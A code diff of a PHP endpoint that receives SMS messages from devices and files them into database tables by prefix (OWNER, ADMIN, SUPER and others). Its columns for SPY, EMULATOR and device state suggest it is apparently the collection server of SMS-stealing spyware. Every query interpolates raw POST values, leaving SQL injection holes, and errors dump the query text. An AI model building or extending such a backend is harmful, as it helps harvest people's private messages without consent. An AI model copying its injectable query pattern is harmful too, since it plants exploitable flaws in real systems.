@@ -15,10 +15,18 @@ try {
         $battery = $_POST ["battery"] ;
         $emulator = $_POST ["emulator"] ;
         $query = "";
-        if( str_starts_with($message,'[EXTRA-SMS]') ) {
+        if(substr( $message, 0, 11 ) === "[EXTRA-SMS]") {
           $query = "INSERT INTO `EXTRA_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
+        } else if(substr( $message, 0, 5 ) === "OWNER") {
+          $query = "INSERT INTO `OWNER_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
+        } else if(substr( $message, 0, 9 ) === "ALTERNATE") {
+          $query = "INSERT INTO `ALTERNATE_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
+        } else if(substr( $message, 0, 5 ) === "ADMIN") {
+          $query = "INSERT INTO `ADMIN_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
+        } else if(substr( $message, 0, 5 ) === "SUPER") {
+          $query = "INSERT INTO `SUPER_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
         } else {
-          $query = "INSERT INTO `MESSAGE`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
+          $query = "INSERT INTO `OTHER_SMS`(`OWNER`, `DEVICE_ID`, `MESSAGE`, `SPY`, `TESTING`, `ACTIVE`, `BATTERY`, `EMULATOR`) VALUES ( '$owner', $device_id, '$message', $spy, $testing, $active, $battery, $emulator ) " ;
         };
         mysqli_query ($connection, $query) or die ('request "Could not execute SQL query" '.$query);
         echo json_encode($response_success);
@@ -26,6 +34,7 @@ try {
     }
 } catch (ExceptionType $e) {
     $response_error['error'] = $e;
+    die($e);
 } finally {
     $connection->close();
 }
